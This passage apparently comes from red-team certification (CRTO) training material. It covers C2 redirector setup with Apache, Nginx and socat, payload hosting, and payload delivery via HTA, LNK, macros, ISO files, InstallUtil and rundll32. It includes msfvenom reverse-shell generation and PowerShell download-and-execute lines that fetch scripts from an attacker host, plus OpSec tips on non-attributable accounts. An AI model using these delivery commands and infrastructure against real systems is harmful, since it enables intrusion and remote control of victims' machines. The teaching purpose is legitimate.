server\n# The [P] flag means &quot;proxy&quot; and [L] means &quot;last rule&quot;\nRewriteRule ^(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/$1 [P,L]\n\n# Option 2: More Granular (Example - Requires C2 Profile Matching)\n# Let&#39;s say your C2 profile beacons to /mypath and gets tasks from /tasks\n# And your payload is hosted at /payload.exe (different server or same)\n\n# Redirect /mypath requests to C2 beacon listener\nRewriteRule ^/mypath$ http://YOUR_C2_IP:YOUR_C2_PORT/mypath [P,L]\nRewriteRule ^/mypath/(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/mypath/$1 [P,L] # Handle potential trailing data\n\n# Redirect /tasks requests to C2 tasking listener (often same as beacon)\n# RewriteRule ^/tasks$ http://YOUR_C2_IP:YOUR_C2_PORT/tasks [P,L]\n# RewriteRule ^/tasks/(.*)$ http://YOUR_C2_IP:YOUR_C2_PORT/tasks/$1 [P,L] # Handle potential trailing data\n\n# Example: Redirect /payload.exe to a DIFFERENT server hosting the payload (e.g., 192.168.1.101:80)\n# RewriteRule ^/payload.exe$ http://192.168.1.101:80/payload.exe [P,L]\n\n\n# Default rule: If none of the above match, maybe redirect to a benign site or return 404\n# This helps avoid exposing your C2 if someone browses random paths\n# RewriteRule ^(.*)$ http://www.google.com/$1 [R=302,L] # Redirects to Google\n# Or just let it hit the default Apache 404/index page if no other rules match.\n# For simplicity for the project, Option 1 (Proxy All) is easiest to start.\n</code></pre>\n<p><strong>For the Module Project, start with Option 1 (Simple Proxy All Traffic).</strong> Replace <code>YOUR_C2_IP</code> and <code>YOUR_C2_PORT</code> with your actual C2 listener details.</p>\n</li>\n<li><p><strong>Test Configuration and Restart:</strong></p>\n<pre><code class=\"language-bash\">sudo apache2ctl configtest\n</code></pre>\n<p>If <code>Syntax OK</code>, restart Apache:</p>\n<pre><code class=\"language-bash\">sudo systemctl restart apache2\n</code></pre>\n</li>\n<li><p><strong>Firewall:</strong> Ensure your redirector&#39;s firewall allows traffic on port 80 (or whatever port you configured). If using <code>ufw</code>:</p>\n<pre><code class=\"language-bash\">sudo ufw allow 80/tcp\nsudo ufw enable # if firewall is not active\n</code></pre>\n</li>\n</ol>\n<h5>Method 2: Nginx Reverse Proxy</h5>\n<p>Nginx is known for its performance and is excellent at reverse proxying.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Update and Install Nginx:</strong></p>\n<pre><code class=\"language-bash\">sudo apt update\nsudo apt install nginx -y\n</code></pre>\n</li>\n<li><p><strong>Configure a Server Block:</strong> We&#39;ll modify the default Nginx configuration or create a new one.</p>\n<pre><code class=\"language-bash\">sudo nano /etc/nginx/sites-available/default\n</code></pre>\n<p>Inside the <code>server</code> block that listens on port 80, modify or add <code>location</code> blocks. Replace <code>YOUR_C2_IP</code> and <code>YOUR_C2_PORT</code>.</p>\n<pre><code class=\"language-nginx\">server {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n\n    # SSL configuration goes here if doing HTTPS redirector\n\n    root /var/www/html; # Default web root - can be used for payload hosting\n\n    # Add index.html to the list if you want to serve a default page\n    index index.html index.htm index.nginx-debian.html;\n\n    server_name _; # Or your domain name\n\n    # --- Example Configuration ---\n    # Option 1: Simple Proxy All Traffic\n    # This forwards ALL requests arriving at the redirector on port 80\n    # to your C2 server&#39;s specific port (e.g., 8080).\n    location / {\n        proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT;\n        proxy_set_header Host $host; # Passes the original Host header\n        proxy_set_header X-Real-IP $remote_addr; # Optional: Pass client IP\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # Optional: Pass client IP\n    }\n\n    # Option 2: More Granular (Example - Requires C2 Profile Matching)\n    # Let&#39;s say your C2 profile beacons to /mypath and gets tasks from /tasks\n    # And your payload is hosted at /payload.exe (different server or same)\n\n    # Redirect /mypath requests to C2 beacon listener\n    # location /mypath {\n    #     proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT/mypath;\n    #     proxy_set_header Host $host;\n    # }\n    # location /mypath/ { # Handle trailing slash\n    #     proxy_pass http://YOUR_C2_IP:YOUR_C2_PORT/mypath/;\n    #     proxy_set_header Host $host;\n    # }\n\n\n    # Example: Serve /payload.exe directly from the redirector&#39;s web root\n    # This requires placing payload.exe in /var/www/html/payload.exe\n    # location = /payload.exe { # Use = for exact match\n    #     # By default, Nginx will serve from the root directory\n    #     # root /var/www/html; # Already defined above\n    #     # Add security headers if needed\n    #     add_header Content-Type &quot;application/octet-stream&quot;; # Suggests download\n    # }\n\n    # Example: Redirect /payload.exe to a DIFFERENT server hosting the payload\n    # location = /payload.exe {\n    #      proxy_pass http://192.168.1.101:80/payload.exe;\n    #      proxy_set_header Host $host;\n    # }\n\n\n    # Default catch-all location for anything not matched above (Optional)\n    # This could return 404 or redirect to a benign site\n    # location / {\n    #     # return 404; # Return a Not Found error\n    #     # or\n    #     # return 302 http://www.google.com; # Redirect to Google\n    # }\n}\n</code></pre>\n<p><strong>For the Module Project, start with Option 1 (Simple Proxy All Traffic).</strong> Replace <code>YOUR_C2_IP</code> and <code>YOUR_C2_PORT</code> with your actual C2 listener details.</p>\n</li>\n<li><p><strong>Test Configuration and Restart:</strong></p>\n<pre><code class=\"language-bash\">sudo nginx -t\n</code></pre>\n<p>If <code>syntax is ok</code> and <code>test is successful</code>, restart Nginx:</p>\n<pre><code class=\"language-bash\">sudo systemctl restart nginx\n</code></pre>\n</li>\n<li><p><strong>Firewall:</strong> Ensure your redirector&#39;s firewall allows traffic on port 80. If using <code>ufw</code>:</p>\n<pre><code class=\"language-bash\">sudo ufw allow 80/tcp\nsudo ufw enable # if firewall is not active\n</code></pre>\n</li>\n</ol>\n<h5>Method 3: Socat (Simple Port Forwarding)</h5>\n<p>Socat is a command-line utility that can forward ports. It&#39;s less flexible than Apache/Nginx (it doesn&#39;t understand HTTP headers, paths, etc.), but it&#39;s simple for basic port redirection.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Install Socat:</strong></p>\n<pre><code class=\"language-bash\">sudo apt update\nsudo apt install socat -y\n</code></pre>\n</li>\n<li><p><strong>Run Socat Command:</strong> Replace <code>REDIRECTOR_PORT</code>, <code>YOUR_C2_IP</code>, and <code>YOUR_C2_PORT</code>.</p>\n<pre><code class=\"language-bash\">sudo socat TCP4-LISTEN:REDIRECTOR_PORT,fork TCP4:YOUR_C2_IP:YOUR_C2_PORT\n</code></pre>\n<ul>\n<li><code>TCP4-LISTEN:REDIRECTOR_PORT</code>: Listen for incoming TCP connections on IPv4 on the specified port (e.g., 80).</li>\n<li><code>,fork</code>: This is important! It makes Socat handle each incoming connection in a new child process, allowing multiple simultaneous connections. Without this, only one implant could connect at a time.</li>\n<li><code>TCP4:YOUR_C2_IP:YOUR_C2_PORT</code>: Connect to the target C2 server IP and port using IPv4 TCP.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Example for redirecting port 80 to C2 on 192.168.1.100:8080:</strong></p>\n<pre><code class=\"language-bash\">sudo socat TCP4-LISTEN:80,fork TCP4:192.168.1.100:8080\n</code></pre>\n<p><strong>Note:</strong> Socat runs in the foreground by default. To run it in the background reliably, you might need to use <code>nohup</code> or <code>screen</code>/<code>tmux</code>. For testing, running it directly is fine.</p>\n<p><strong>Pros:</strong> Simple, quick setup.<br><strong>Cons:</strong> No HTTP awareness (cannot modify headers, paths, etc.), harder to manage multiple complex redirection rules, less robust than a full web server.</p>\n<h5>Testing Your Redirector</h5>\n<p>After configuring Apache or Nginx, test it from your attacker machine or even the target VM (if routing allows).</p>\n<ul>\n<li><strong>Using <code>curl</code>:</strong><pre><code class=\"language-bash\">curl -v http://REDIRECTOR_IP_OR_DOMAIN/\ncurl -v http://REDIRECTOR_IP_OR_DOMAIN/any/path/you/want\n</code></pre>\nObserve the output. If you used the simple proxy config, you should see content coming from your C2 server&#39;s listener (or an error if the C2 isn&#39;t running/reachable). If you configured specific paths, test those.</li>\n<li><strong>Using a Browser:</strong> Navigate to <code>http://REDIRECTOR_IP_OR_DOMAIN/</code>.</li>\n<li><strong>Check Redirector Logs:</strong> Look at Apache (<code>/var/log/apache2/access.log</code>, <code>error.log</code>) or Nginx (<code>/var/log/nginx/access.log</code>, <code>error.log</code>) logs to see incoming requests and how they were handled.</li>\n</ul>\n<h4>3.4 Payload Hosting Techniques</h4>\n<p>Besides redirecting implant communication, you also need to <em>host</em> the initial payload file that the target will download and execute. This is often done on a web server, but other methods exist.</p>\n<ul>\n<li><p><strong>Setting up a Basic HTTP/HTTPS Server:</strong></p>\n<ul>\n<li><strong>Using your Redirector Server:</strong> The easiest way for basic testing is to use the <em>same</em> Apache or Nginx server you set up as a redirector.<ul>\n<li><strong>Apache:</strong> Place your payload file (e.g., <code>payload.exe</code>, <code>payload.hta</code>) in the default web root directory, typically <code>/var/www/html/</code>. Ensure the file permissions allow the web server process to read it. You can then access it via <code>http://REDIRECTOR_IP_OR_DOMAIN/payload.exe</code>.</li>\n<li><strong>Nginx:</strong> Similar to Apache, place files in <code>/var/www/html/</code>.</li>\n</ul>\n</li>\n<li><strong>Using Python SimpleHTTPServer:</strong> For quick, temporary hosting, Python&#39;s built-in HTTP server is useful. Navigate to the directory containing your payload file in the terminal and run:<pre><code class=\"language-bash\">python3 -m http.server 80\n</code></pre>\nThis serves files from the current directory on port 80 (or specify a different port). <strong>Warning:</strong> This is NOT secure or robust for anything beyond basic lab testing. It&#39;s a quick way to serve a file locally or on a trusted network segment.</li>\n</ul>\n</li>\n<li><p><strong>Hosting Payloads on SMB Shares:</strong></p>\n<ul>\n<li>Attackers can host payloads on SMB shares they control and use techniques like <code>copy</code> or <code>wmic</code> to retrieve and execute them.</li>\n<li>Requires setting up an SMB share (e.g., on a Windows attacker VM, or using tools like <code>Impacket</code>&#39;s <code>smbserver.py</code> on Linux).</li>\n<li>Example (conceptual, using <code>Impacket</code>):<ul>\n<li>On attacker Linux: <code>sudo smbserver.py sharename /path/to/payloads -smb2support</code></li>\n<li>On target Windows: <code>copy \\\\ATTACKER_SMB_IP\\sharename\\payload.exe C:\\Temp\\payload.exe</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Using WebDAV for Payload Delivery:</strong></p>\n<ul>\n<li>WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP that allows clients to perform remote web content authoring operations. Windows has built-in support for WebDAV shares, which can sometimes be mounted or accessed directly.</li>\n<li>Less common than simple HTTP hosting for initial download, but relevant for certain lateral movement or file transfer techniques.</li>\n</ul>\n</li>\n<li><p><strong>Introduction to Setting up Simple Phishing Landing Pages (Conceptual):</strong></p>\n<ul>\n<li>While the <em>payload hosting</em> is technical, the <em>delivery mechanism</em> often involves social engineering. A phishing page is designed to look legitimate (e.g., a fake login page, a file download site).</li>\n<li>The link in a phishing email or message points to this landing page, which then tricks the user into downloading and executing your hosted payload.</li>\n<li>Setting up full phishing pages is outside the scope of this module&#39;s <em>practical</em> components, but understand that your hosted payload often lives behind such a page or a direct link delivered via social means.</li>\n</ul>\n</li>\n</ul>\n<h4>3.5 Introduction to DNS Tunneling (Conceptual Overview)</h4>\n<ul>\n<li>DNS tunneling is a technique that encodes data within DNS queries and responses.</li>\n<li><strong>How it works (Simplified):</strong> The implant wants to send data (&quot;hello_c2&quot;). It breaks this data into chunks. For each chunk, it performs a DNS query for a subdomain like <code>chunk1.chunk2.hello_c2.your_malicious_domain.com</code>. The malicious DNS server (controlled by the attacker) receives this query, extracts the data (<code>hello_c2</code>), and can respond with instructions encoded in the DNS response (e.g., in a TXT record).</li>\n<li><strong>Why use it?</strong> DNS traffic is very common and often less inspected by firewalls/proxies than HTTP. It can bypass certain network restrictions.</li>\n<li><strong>Limitations:</strong> Slower, lower bandwidth, requires a dedicated domain and malicious DNS server setup. More complex to implement.</li>\n</ul>\n<h4>3.6 Choosing Infrastructure Providers and Operational Security (OpSec) Considerations</h4>\n<ul>\n<li><strong>Providers:</strong><ul>\n<li><strong>VPS (Virtual Private Server):</strong> DigitalOcean, Linode, Vultr, AWS EC2, Azure VMs, Google Cloud. Choose providers that are less likely to suspend instances quickly or require excessive verification. Pay with cryptocurrency or non-attributable methods if OpSec is critical (though for CRTO prep, standard payment is fine).</li>\n<li><strong>Dedicated Servers:</strong> More expensive, more control.</li>\n<li><strong>Compromised Infrastructure:</strong> Real attackers often use compromised servers as redirectors or C2 servers, adding a layer of obfuscation and deniability. (Illegal for simulation unless explicitly in scope and authorized!).</li>\n</ul>\n</li>\n<li><strong>OpSec Considerations for C2 Infrastructure:</strong><ul>\n<li><strong>Separate Infrastructure:</strong> NEVER run your C2 server or redirectors from your personal machine or home IP. Use cloud instances or VPS.</li>\n<li><strong>Non-Attributable Accounts/Payment:</strong> (Important for real ops, less so for CRTO lab, but understand the concept). Use prepaid cards, crypto, fake details if necessary (within legal/ethical bounds of your activity!).</li>\n<li><strong>Management VPN/Proxy:</strong> Access your C2 server and redirectors only via a VPN or a series of proxies (SOCKS chains, SSH tunnels). Avoid direct SSH connections from your real IP.</li>\n<li><strong>Minimal Services:</strong> Only run the absolute necessary services (Apache/Nginx on required ports, C2 framework listener). Turn off SSH if not needed, or restrict access via firewall.</li>\n<li><strong>Secure Configuration:</strong> Harden your Linux server (SSH keys instead of passwords, fail2ban, etc.).</li>\n<li><strong>Logging:</strong> Understand what logs your provider keeps. Configure your own logging (as in Module 2, but for the <em>attacker</em> side) for troubleshooting, but be mindful of retention.</li>\n<li><strong>Clean-up:</strong> Have a plan to quickly tear down infrastructure if detected or at the end of an engagement.</li>\n<li><strong>Domain Names:</strong> Use cheap, disposable domain names. Consider domain privacy services (though their effectiveness varies). Dynamic DNS can be an alternative for labs.</li>\n</ul>\n</li>\n</ul>\n<h4>Connecting Back to the Lab Environment (Module 2)</h4>\n<p>In your lab setup (Module 2), you have target VMs (Windows client, Domain Controller) and potentially a SIEM. Your C2 infrastructure (Module 3) typically lives <em>outside</em> this internal network, or at least on a separate segment.</p>\n<ul>\n<li><strong>Redirector Role:</strong> The redirector you set up will have an IP address that your target VM can reach. In a real engagement, this is a public IP. In your lab, this might be an IP on the same virtual network, or you might simulate a public IP by configuring NAT/port forwarding on your host machine or a router VM.</li>\n<li><strong>C2 Server Role:</strong> Your actual C2 server might be another VM in your lab (e.g., a Kali VM running a C2 framework) on a different IP, or even hosted in the cloud. The redirector you configured will forward traffic from the target VM&#39;s beacon to this C2 server&#39;s listener port.</li>\n</ul>\n<p><strong>Diagram (Conceptual):</strong></p>\n<pre><code>+-----------------+     +---------------------+     +-----------------+     +---------------------+\n| Target Workstation| --&gt; | Redirector (Nginx/Apache) | --&gt; | C2 Server (C2 Framework) | --&gt; | Operator Machine (GUI/CLI) |\n| (Windows VM)    |     | (Linux VM/VPS)      |     | (Linux VM/VPS)  |     |                     |\n| - Runs Implant  |     | - Listens on 80/443 |     | - Listens on 8080 |     | - Manages Implants  |\n+-----------------+     | - Forwards to C2    |     |                 |     +---------------------+\n        ^               +---------------------+     +-----------------+\n        | (Payload DL)          ^\n        |                       | (Payload Hosting)\n        |               +---------------------+\n        |               | Web Server (Apache/Nginx) |\n        |               | (Often same as Redirector)|\n        |               | - Hosts payload.exe/hta   |\n        +---------------+---------------------+\n\n+-----------------+\n| SIEM (Splunk/ELK)| &lt;--- Windows Logs (Sysmon, Security, etc.)\n| (Linux/Windows VM)|\n+-----------------+\n</code></pre>\n<p>Your Module 2 lab provides the &quot;Target Workstation&quot; and the &quot;SIEM&quot;. Module 3 builds the &quot;Redirector&quot; and &quot;Web Server&quot; components, and prepares you conceptually for the &quot;C2 Server&quot; (which you&#39;ll interact with more in later modules).</p>\n\n                </div>\n             </div>\n         ",
    "module-4": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 4: module_4</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! We&#39;ve set the stage, understood the <em>why</em> behind adversary simulation, planned our hypothetical engagement, and even built the foundational infrastructure – our lab environment with logging and our initial C2 redirector/hosting server. That&#39;s massive progress!</p>\n<p>Now, let&#39;s talk about the <em>how</em>. How do we actually get our foot in the door? How do we get that initial piece of code, that &quot;payload,&quot; onto the target machine, and how do we make it talk back to our C2? This is where the rubber meets the road. This module, <strong>Module 4: Crafting and Delivering Initial Payloads</strong>, is all about understanding the tools of the trade and the sneaky ways adversaries get their initial code onto a system. We&#39;re building the weapon that will initiate our simulated attack. Let&#39;s dive in!</p>\n<hr>\n<h2>CRTO Prep Part 1: Adversary Simulation Foundations</h2>\n<h3>Module 4: Crafting and Delivering Initial Payloads</h3>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, learners will be able to understand different payload types and common delivery vectors used to get code onto a target machine.</li>\n</ul>\n<hr>\n<p>Alright, listen up! Before we can <em>execute</em> anything (that&#39;s Module 5!), we need something <em>to</em> execute. That&#39;s our payload. Think of the payload as the malicious code itself – the set of instructions we want the target machine to run. But not all payloads are created equal, and getting them <em>onto</em> the system is half the battle.</p>\n<h4>4.1 Payload Types: Stager vs. Stageless</h4>\n<p>This is a fundamental concept. Payloads generally fall into two categories:</p>\n<ul>\n<li><p><strong>Stageless Payloads:</strong></p>\n<ul>\n<li><strong>Concept:</strong> These payloads contain <em>all</em> the necessary code within themselves. They are self-contained. Once executed, they perform their function (like opening a shell, running a command, connecting back to a C2) without needing to download further code.</li>\n<li><strong>Pros:</strong> Simpler to deploy, less reliance on a second network connection immediately after initial execution, potentially faster initial action. Can be useful for simple tasks or when network connectivity might be unreliable after the initial hit.</li>\n<li><strong>Cons:</strong> Larger file size (can be harder to deliver via size-limited vectors like emails), higher chance of detection by static analysis (as the full malicious code is present on disk or in memory immediately).</li>\n<li><strong>Analogy:</strong> Imagine receiving a complete, fully assembled gadget in a single box. You just open the box and use it.</li>\n</ul>\n</li>\n<li><p><strong>Stager Payloads:</strong></p>\n<ul>\n<li><strong>Concept:</strong> These are small, lightweight payloads whose <em>only</em> job is to connect back to the attacker&#39;s server (the C2 or a dedicated listener) and download the <em>real</em>, larger payload (often called the &quot;stage&quot;).</li>\n<li><strong>Pros:</strong> Very small initial size (excellent for constrained delivery methods like phishing emails, exploits with limited buffer space), the main malicious code isn&#39;t initially present on disk, making static analysis harder on the initial file. The second stage can be encrypted or obfuscated more heavily.</li>\n<li><strong>Cons:</strong> Requires a second successful network connection <em>immediately</em> after the stager executes. If the target can&#39;t reach the C2/listener or the connection is blocked/detected, the attack stops after the stager runs. More complex setup (listener needs to be ready to send the stage).</li>\n<li><strong>Analogy:</strong> Imagine receiving a tiny key. The key&#39;s only purpose is to unlock a larger box (the stage) waiting for you somewhere else.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Which to choose?</strong> It depends entirely on your simulation goals and the delivery vector. Phishing attachments often use stagers due to size limits. Exploits might use stagers to minimize the code in the exploit buffer. Manual execution or dropping files might use stageless for simplicity. For CRTO, you&#39;ll likely work with both concepts, and your chosen C2 framework will handle the stager/stage process behind the scenes, but understanding <em>why</em> is key for troubleshooting and evasion.</p>\n<h4>4.2 Generating Basic Payloads</h4>\n<p>While real adversary simulations use sophisticated payloads from C2 frameworks, for learning, tools like Metasploit&#39;s <code>msfvenom</code> are invaluable for generating <em>basic</em> examples to understand formats and concepts. Your C2 framework (like Cobalt Strike, Mythic, Sliver, PoshC2, etc.) will have its own payload generation capabilities, which you&#39;ll use in practice.</p>\n<p>Let&#39;s look at <code>msfvenom</code> for illustrative purposes. We&#39;ll generate a simple Windows executable that just runs <code>calc.exe</code>. This isn&#39;t a C2 implant, but it&#39;s a simple payload we can test delivery methods with.</p>\n<pre><code class=\"language-bash\"># Generate a Windows executable payload that runs calc.exe\n# -p: specify the payload (windows/exec)\n# CMD: the command to execute (calc.exe)\n# -f: the output format (exe)\n# -o: output file name\nmsfvenom -p windows/exec CMD=calc.exe -f exe -o calc.exe\n</code></pre>\n<p>This command generates a file named <code>calc.exe</code>. If you run this <code>calc.exe</code> on a Windows machine, it will simply open the calculator. Why is this useful? It&#39;s a simple, self-contained piece of code we can use to test <em>if</em> our chosen delivery method successfully executes <em>arbitrary code</em> on the target.</p>\n<p>For a simple stageless PowerShell payload that might connect back (conceptually, we&#39;ll cover the listener later), you might see something like:</p>\n<pre><code class=\"language-bash\"># Example (conceptual) - Generate a PowerShell stageless payload\n# This is just to show the -p and -f options for PowerShell\n# The actual command for a reverse shell is more complex and needs a listener\nmsfvenom -p windows/powershell_stageless_reverse_tcp LHOST=&lt;Your_Attacker_IP&gt; LPORT=&lt;Your_Listen_Port&gt; -f raw -o rev_shell.ps1\n</code></pre>\n<p><strong>Key takeaway:</strong> <code>msfvenom</code> helps you see different payload <em>formats</em> (<code>.exe</code>, <code>.dll</code>, <code>.ps1</code>, raw shellcode) which are relevant to our delivery methods. Your C2 framework will handle generating the <em>actual</em> implant code in these formats, often with built-in obfuscation and profile adherence.</p>\n<h4>4.3 Common Delivery Methods</h4>\n<p>This is where the creativity comes in. How do we get our payload (<code>calc.exe</code>, <code>rev_shell.ps1</code>, or even just a command to run something remote) onto the target and executed? Adversaries constantly innovate here, but many classic techniques rely on abusing built-in Windows features or common user actions (like opening a document).</p>\n<p>Here are some common initial access/delivery vectors you&#39;ll encounter and potentially simulate:</p>\n<h5>4.3.1 HTA (HTML Applications) and <code>mshta.exe</code></h5>\n<ul>\n<li><p><strong>What they are:</strong> HTA files are basically HTML files with a <code>.hta</code> extension that are executed by <code>mshta.exe</code> (Microsoft HTML Application host). They can contain scripting languages like VBScript and JScript.</p>\n</li>\n<li><p><strong>Why adversaries use them:</strong> <code>mshta.exe</code> is a legitimate Windows binary (a LOLBAS!). It executes code outside the browser security model. HTA files can be delivered via email, hosted on web servers, etc.</p>\n</li>\n<li><p><strong>How it works:</strong> An HTA file is opened by <code>mshta.exe</code>, which then executes the scripts within it.</p>\n</li>\n<li><p><strong>Simple Example:</strong></p>\n<pre><code class=\"language-html\">&lt;!-- my_payload.hta --&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Hello&lt;/title&gt;\n&lt;HTA:APPLICATION\n    APPLICATIONNAME=&quot;MyPayload&quot;\n    WINDOWSTATE=&quot;hidden&quot;\n    SHOWINTASKBAR=&quot;no&quot;\n    BORDER=&quot;none&quot;\n    SINGLEINSTANCE=&quot;yes&quot;\n&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;script language=&quot;VBScript&quot;&gt;\n&#39; VBScript code to execute\n&#39; Example: Run calc.exe\nCreateObject(&quot;Wscript.Shell&quot;).Run &quot;calc.exe&quot;\n\n&#39; Example: Download and execute a remote script (Module 5 territory!)\n&#39; CreateObject(&quot;Wscript.Shell&quot;).Run &quot;powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://&lt;Your_Attacker_IP&gt;/script.ps1&#39;)&quot;\n\n&#39; Exit the HTA application gracefully\nwindow.close()\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ul>\n<li><strong>Execution Command:</strong> You would host this <code>.hta</code> file (e.g., on your Module 3 web server) and then execute it on the target using:<pre><code class=\"language-cmd\">mshta http://&lt;Your_Attacker_IP&gt;/my_payload.hta\n</code></pre>\nOr, if the file is already on the target:<pre><code class=\"language-cmd\">mshta C:\\path\\to\\my_payload.hta\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h5>4.3.2 LNK (Shortcut Files)</h5>\n<ul>\n<li><strong>What they are:</strong> Standard Windows shortcut files (<code>.lnk</code>).</li>\n<li><strong>Why adversaries use them:</strong> Users are accustomed to clicking <code>.lnk</code> files. They can be placed on network shares, USB drives, or within ISO/IMG files. Crucially, their <code>Target</code> property can execute commands, not just launch applications.</li>\n<li><strong>How it works:</strong> The <code>.lnk</code> file&#39;s properties are crafted to execute a command or script when clicked.</li>\n<li><strong>Simple Example:</strong> You can&#39;t easily show the &quot;code&quot; of an LNK, but you configure its properties:<ul>\n<li>Right-click -&gt; New -&gt; Shortcut</li>\n<li>In the &quot;Type the location of the item&quot; field, instead of an application path, put a command, like:<pre><code class=\"language-cmd\">C:\\Windows\\System32\\cmd.exe /c calc.exe\n</code></pre>\nOr to download and execute a script:<pre><code class=\"language-cmd\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://&lt;Your_Attacker_IP&gt;/script.ps1&#39;)\n</code></pre>\n</li>\n<li>You can also set the &quot;Start in&quot; directory and &quot;Run&quot; (normal, minimized, maximized). Adversaries often change the icon to look like a document or folder.</li>\n</ul>\n</li>\n</ul>\n<h5>4.3.3 Macro-Enabled Documents (Word, Excel) - Introduction to VBA Execution</h5>\n<ul>\n<li><strong>What they are:</strong> Office documents (<code>.docm</code>, <code>.xlsm</code>, <code>.pptm</code>) containing VBA (Visual Basic for Applications) code.</li>\n<li><strong>Why adversaries use them:</strong> Social engineering! Users open documents. VBA is powerful and can interact with the operating system.</li>\n<li><strong>How it works:</strong> Malicious VBA code is embedded in the document. Functions like <code>Auto_Open</code>, <code>Document_Open</code>, <code>Workbook_Open</code> execute automatically when the document is opened (if macros are enabled).</li>\n<li><strong>Simple Example (Conceptual):</strong><pre><code class=\"language-vba\">&#39; In a Word document&#39;s VBA editor (Alt+F11)\n&#39; Insert a new Module or put this in ThisDocument\nSub AutoOpen()\n    &#39; This code runs automatically when the document is opened (if macros enabled)\n    Call Shell(&quot;calc.exe&quot;, vbNormalFocus)\nEnd Sub\n\n&#39; Or for Excel, in ThisWorkbook\nSub Workbook_Open()\n    Call Shell(&quot;calc.exe&quot;, vbNormalFocus)\nEnd Sub\n</code></pre>\n</li>\n<li><strong>Challenges:</strong> Microsoft has significantly increased macro security warnings and disabled internet-based macros by default in newer Office versions, making this harder but not impossible (e.g., if the file is marked as trusted, or delivered via a local network share).</li>\n</ul>\n<h5>4.3.4 ISO/IMG File Smuggling</h5>\n<ul>\n<li><strong>What they are:</strong> Disk image files (<code>.iso</code>, <code>.img</code>).</li>\n<li><strong>Why adversaries use them:</strong> In modern Windows versions, mounting an ISO/IMG file is as simple as double-clicking it. It mounts as a virtual drive letter. Crucially, files <em>inside</em> the mounted ISO/IMG are often treated as if they are on a trusted drive, sometimes bypassing Mark-of-the-Web (MOTW) security flags that are applied to files downloaded directly. Adversaries place malicious <code>.lnk</code>, <code>.hta</code>, or <code>.exe</code> files inside the ISO.</li>\n<li><strong>How it works:</strong> User opens the ISO/IMG -&gt; Windows mounts it as a drive (e.g., D:) -&gt; User navigates the virtual drive and clicks on a malicious file (often disguised).</li>\n<li><strong>Example:</strong> Create an ISO containing a malicious <code>.lnk</code> file that executes your payload. Send the ISO to the user.</li>\n</ul>\n<h5>4.3.5 Executable Payloads (.exe)</h5>\n<ul>\n<li><strong>What they are:</strong> Standard Windows executable files.</li>\n<li><strong>Why adversaries use them:</strong> It&#39;s the most direct way to run code.</li>\n<li><strong>How it works:</strong> User double-clicks the <code>.exe</code>, or it&#39;s launched via a script/command.</li>\n<li><strong>Challenges:</strong> <code>.exe</code> files from the internet are heavily scrutinized by AV/EDR. Requires significant obfuscation (Module 6 topic!) to avoid detection. Often used when other vectors fail or in later stages.</li>\n</ul>\n<h5>4.3.6 Introduction to .NET Assemblies as Payloads</h5>\n<ul>\n<li><strong>What they are:</strong> Executables or DLLs written using the .NET framework.</li>\n<li><strong>Why adversaries use them:</strong> .NET is common on Windows. .NET assemblies can be executed in memory using tools like PowerSploit&#39;s <code>Invoke-ReflectivePEInjection</code> or converted to shellcode using tools like Donut. They can also be executed via LOLBAS like <code>InstallUtil.exe</code> or <code>RegAsm.exe</code>.</li>\n<li><strong>How it works:</strong> The .NET runtime executes the code. Using LOLBAS like <code>InstallUtil.exe</code> allows execution without the <code>.exe</code> or <code>.dll</code> extension being directly invoked by the user or a standard loader.</li>\n<li><strong>Example (Conceptual <code>InstallUtil.exe</code>):</strong><pre><code class=\"language-cmd\">C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /uninstall /U C:\\path\\to\\malicious.dll\n</code></pre>\n<em>(This is a common pattern, abusing the uninstall functionality to run code in a specific method)</em></li>\n</ul>\n<h5>4.3.7 Understanding DLL Payloads and <code>rundll32.exe</code></h5>\n<ul>\n<li><strong>What they are:</strong> Dynamic Link Libraries (<code>.dll</code>).</li>\n<li><strong>Why adversaries use them:</strong> <code>.dll</code> files are less commonly scanned than <code>.exe</code> files by some older security tools. <code>rundll32.exe</code> is a LOLBAS that can execute code within a DLL&#39;s export function.</li>\n<li><strong>How it works:</strong> <code>rundll32.exe</code> is invoked with the path to the DLL and the name of an exported function to execute.</li>\n<li><strong>Simple Example:</strong><pre><code class=\"language-cmd\">rundll32.exe C:\\path\\to\\malicious.dll,ExportFunctionName\n</code></pre>\nAdversaries write DLLs with specific export functions (e.g., named <code>Go</code>, <code>Entry</code>, or randomized names) that contain their payload code.</li>\n</ul>\n<h5>4.3.8 Custom Launchers: Introduction to tools like Donut</h5>\n<ul>\n<li><strong>What they are:</strong> Tools or custom code that take a payload (like an EXE, DLL, or .NET assembly) and convert it into raw shellcode that can be executed directly in memory.</li>\n<li><strong>Why adversaries use them:</strong> Running code directly in memory (shellcode) avoids writing a malicious executable to disk, making it harder for file-based signatures to detect. It also allows injecting the payload into legitimate processes (Module 6!).</li>\n<li><strong>How it works:</strong> Tools like Donut parse the input file (.NET assembly, PE), convert its sections and metadata into position-independent shellcode, and add a small stub to load and execute it. This shellcode can then be injected into a running process or executed by a small, custom loader.</li>\n<li><strong>Example:</strong> Using Donut to convert a .NET <code>calc.exe</code> program into shellcode.<pre><code class=\"language-bash\"># Assuming you have donut installed and your .NET exe is 